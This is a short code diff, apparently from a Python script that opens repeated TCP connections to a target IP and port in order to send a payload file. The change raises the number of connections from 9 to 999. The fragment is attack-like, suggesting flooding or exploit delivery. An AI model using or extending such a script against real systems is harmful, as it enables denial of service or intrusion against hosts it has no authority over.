@@ -3,7 +3,7 @@ import socket
 
 
 def main(target_ip, target_port, payload_file):
-    for i in range(1, 10):
+    for i in range(1, 1000):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((target_ip, target_port))
         sock.settimeout(None)
